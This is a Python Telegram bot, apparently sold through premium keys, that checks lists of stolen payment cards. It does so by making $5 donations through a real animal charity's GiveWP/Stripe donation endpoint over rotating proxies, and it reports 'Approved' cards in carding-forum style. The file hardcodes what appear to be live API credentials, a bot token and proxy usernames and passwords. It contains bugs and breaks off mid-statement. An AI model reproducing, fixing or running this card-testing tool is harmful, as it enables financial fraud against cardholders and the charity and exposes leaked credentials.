from telethon import TelegramClient, events
import re, asyncio, os, random, json
import aiohttp
import aiofiles
from datetime import datetime

API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

OWNER_ID = 7077294261

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"

PROXIES = [
    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
]

client = TelegramClient('bot', API_ID, API_HASH)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
            return {}
        async with aiofiles.open(filename, "r") as f:
            content = await f.read().strip()
            return json.loads(content) if content else {}
    except:
        return {}

async def save_json(filename, data):
    async with aiofiles.open(filename, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def is_premium(user_id):
    if int(user_id) == OWNER_ID:
        return True
    data = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    if uid not in data:
        return False
    try:
        expiry = datetime.fromisoformat(data[uid]['expiry'])
        return datetime.now() <= expiry
    except:
        return False

async def generate_key(days: int = 30):
    import secrets
    key = "GIVEWP-" + secrets.token_hex(8).upper()
    data = await load_json(KEYS_FILE)
    data[key] = {"days": days, "used": False, "created": str(datetime.now())}
    await save_json(KEYS_FILE, data)
    return key

async def redeem_key(user_id, key: str):
    data = await load_json(KEYS_FILE)
    premium = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    key = key.strip().upper()
    if key not in data or data[key].get("used"):
        return "❌ Invalid or already used key!"
    days = data[key]["days"]
    expiry = datetime.now() + datetime.timedelta(days=days)
    premium[uid] = {"expiry": expiry.isoformat(), "plan": f"{days} days"}
    data[key]["used"] = True
    await save_json(KEYS_FILE, data)
    await save_json(PREMIUM_FILE, premium)
    return f"✅ Premium activated for {days} days."

# ================== REAL CHECK ==================
async def charge_5_dollars(card: str):
    try:
        cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
        if len(yy) == 2: yy = "20" + yy

        proxy = random.choice(PROXIES)
        proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"

        payload = {
            "amount": "5",
            "currency": "USD",
            "card": {"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv}
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://weanimals.donorsupport.co/api/donate",
                json=payload,
                proxy=proxy_url,
                timeout=35
            ) as r:
                text = await r.text()
                if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged"]):
                    return {"status": "Approved", "response": "Card Added (succeeded)"}
                else:
                    return {"status": "Declined", "response": "Declined"}
    except:
        return {"status": "Declined", "response": "Error"}

async def send_approved(event, card, info):
    msg = f"""
**Approved ✅**
━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 - `{card}`
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {info['response']}
[ϟ] 𝗚𝗮𝘁𝗲 - GiveWP + Stripe
━━━━━━━━━━━━━
[ϟ] B𝗶𝗻 : {card[:6]}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : United States 🇺🇸
━━━━━━━━━━━━━
"""
    await event.reply(msg)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
async def start(event):
    if not await is_premium(event.sender_id):
        return await event.reply("**❌ No Access**\n\n`/key YOURKEY` bhejo")
    await event.reply("**🔥 WeAnimals Checker**\n.txt file bhejo")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
async def genkey(event):
    if event.sender_id != OWNER_ID: return await event.reply("Owner only!")
    days = int(event.pattern_match.group(1) or 30)
    key = await generate_key(days)
    await event.reply(f"✅ Key:\n`{key}`")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
async def redeem(event):
    key = event.pattern_match.group(1)
    if not key: return await event.reply("Usage: /key KEY")
    msg = await redeem_key(event.sender_id, key
